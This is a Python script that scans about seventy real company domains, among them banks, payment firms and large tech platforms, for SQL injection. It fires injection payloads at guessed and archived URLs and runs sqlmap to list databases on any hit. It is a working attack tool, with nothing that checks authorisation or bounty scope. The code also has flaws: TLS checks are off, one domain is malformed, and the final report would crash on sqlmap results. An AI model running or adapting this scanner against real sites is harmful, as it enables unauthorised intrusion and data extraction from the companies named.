#!/usr/bin/env python3

import requests
import subprocess
import json
import re
import time
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ExpandedDomainScanner:
    def __init__(self):
        # Expanded list of domains from bug bounty programs
        self.domains = [
            # Financial Services
            'acorns.com', 'robinhood.com', 'chime.com', 'venmo.com',
            'paypal.com', 'stripe.com', 'square.com', 'coinbase.com',
            'zelle.com', 'mastercard.com', 'visa.com', 'americanexpress.com',
            
            # Technology Companies
            'digitalocean.com', 'shopify.com', 'gitlab.com', 'github.com',
            'atlassian.com', 'slack.com', 'dropbox.com', 'spotify.com',
            'netflix.com', 'uber.com', 'airbnb.com', 'reddit.com',
            
            # Social Media & Communication
            'twitter.com', 'facebook.com', 'linkedin.com', 'pinterest.com',
            'snapchat.com', 'discord.com', 'telegram.org', 'whatsapp.com',
            
            # E-commerce & Retail
            'amazon.com', 'ebay.com', 'etsy.com', 'walmart.com',
            'target.com', 'bestbuy.com', 'wayfair.com', 'overstock.com',
            
            # Enterprise & Business
            'salesforce.com', 'microsoft.com', 'google.com', 'apple.com',
            'oracle.com', 'sap.com', 'adobe.com', 'zoom.us',
            
            # Media & Entertainment
            'youtube.com', 'twitch.tv', 'hulu.com', 'disney.com',
            'paramount.com', 'warner.com', 'sony.com', 'universal.com',
            
            # Travel & Hospitality
            'booking.com', 'expedia.com', 'hotels.com', 'marriott.com',
            'hilton.com', 'delta.com', 'united.com', 'southwest.com',
            
            # Education & Job Platforms
            'indeed.com', 'linkedin.com', 'glassdoor.com', 'monster.com',
            'coursera.org', 'udemy.com', 'edx.org', 'khan.academy.org'
        ]
        
        self.vulnerable_urls = []
        self.extracted_data = []
    
    def test_quick_sqli(self, url):
        """Quick SQL injection test"""
        payloads = ["'", "' OR '1'='1", "1' OR '1'='1"]
        
        for payload in payloads:
            try:
                test_url = url + payload
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check for SQL errors
                if any(error in response.text.lower() for error in [
                    'sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 
                    'sqlite', 'microsoft jet', 'odbc', 'oledb'
                ]):
                    return {
                        'url': url,
                        'payload': payload,
                        'vulnerable': True,
                        'method': 'Quick SQLi Test'
                    }
            except:
                continue
        return None
    
    def collect_urls_from_domain(self, domain):
        """Collect URLs from a domain"""
        urls = set()
        
        # Common endpoints that might be vulnerable
        endpoints = [
            '/search?q=test', '/api/search?query=test', '/user?id=1',
            '/product?id=1', '/category?id=1', '/page?id=1',
            '/profile?id=1', '/account?user_id=1', '/admin?id=1',
            '/api/users?id=1', '/api/v1/search?q=test', '/graphql?query=test',
            '/support/search?q=test', '/help/search?q=test', '/blog/search?q=test'
        ]
        
        base_url = f"https://{domain}"
        for endpoint in endpoints:
            urls.add(urljoin(base_url, endpoint))
        
        # Try to get URLs from Wayback Machine
        try:
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=50"
            response = requests.get(wayback_url, timeout=15)
            if response.status_code == 200:
                data = response.json()
                for entry in data[1:]:
                    url = entry[2]
                    if url and '?' in url and url.startswith('http'):
                        urls.add(url)
        except:
            pass
        
        return list(urls)
    
    def quick_sqlmap_test(self, url):
        """Quick SQLMap test with basic settings"""
        try:
            cmd = [
                'sqlmap', '-u', url, '--batch', '--timeout=30',
                '--level=1', '--risk=1', '--technique=B', '--dbs'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                # Try to extract basic database info
                databases = re.findall(r'available databases.*?:\s*(.*)', result.stdout, re.IGNORECASE)
                
                return {
                    'url': url,
                    'tool': 'SQLMap Quick',
                    'vulnerable': True,
                    'databases': databases[0].split(',') if databases else [],
                    'output_snippet': result.stdout[:300]
                }
        except:
            pass
        
        return None
    
    def scan_domains(self):
        """Scan all domains for SQL injection"""
        print(f"[+] Scanning {len(self.domains)} domains...")
        
        all_results = []
        
        for i, domain in enumerate(self.domains):
            print(f"\n[{i+1}/{len(self.domains)}] Scanning {domain}")
            
            # Collect URLs
            urls = self.collect_urls_from_domain(domain)
            print(f"  [+] Collected {len(urls)} URLs")
            
            # Test URLs
            for url in urls[:5]:  # Test first 5 URLs per domain
                # Quick manual test
                manual_result = self.test_quick_sqli(url)
                if manual_result:
                    print(f"  [!] Manual test found vulnerability: {url}")
                    all_results.append(manual_result)
                    
                    # Try quick SQLMap
                    sqlmap_result = self.quick_sqlmap_test(url)
                    if sqlmap_result:
                        print(f"  [!] SQLMap confirmed: {url}")
                        all_results.append(sqlmap_result)
                        
                        # Stop after finding 5 vulnerable URLs total
                        if len(all_results) >= 5:
                            break
            
            if len(all_results) >= 5:
                break
        
        # Save results
        with open('expanded_scan_results.json', 'w') as f:
            json.dump(all_results, f, indent=2)
        
        print(f"\n=== SCAN COMPLETE ===")
        print(f"Found {len(all_results)} vulnerable URLs")
        
        for i, result in enumerate(all_results, 1):
            print(f"{i}. {result['url']} - {result['method']}")
            if result.get('databases'):
                print(f"   Databases: {result['databases']}")
        
        return all_results

if __name__ == "__main__":
    scanner = ExpandedDomainScanner()
    scanner.scan_domains()
